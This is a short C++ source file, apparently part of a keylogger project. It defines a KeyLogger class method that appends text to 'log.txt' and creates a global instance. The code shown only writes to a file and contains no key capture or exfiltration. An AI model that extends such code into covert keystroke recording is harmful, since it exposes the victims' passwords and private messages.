#include "logger.h"
#include <fstream>


void KeyLogger::WriteToFile( const std::string_view &in ) {
	std::ofstream file { };
	file.open( "log.txt", std::ios::app );
	file << in;
	file.close( );
}

KeyLogger g_log { };
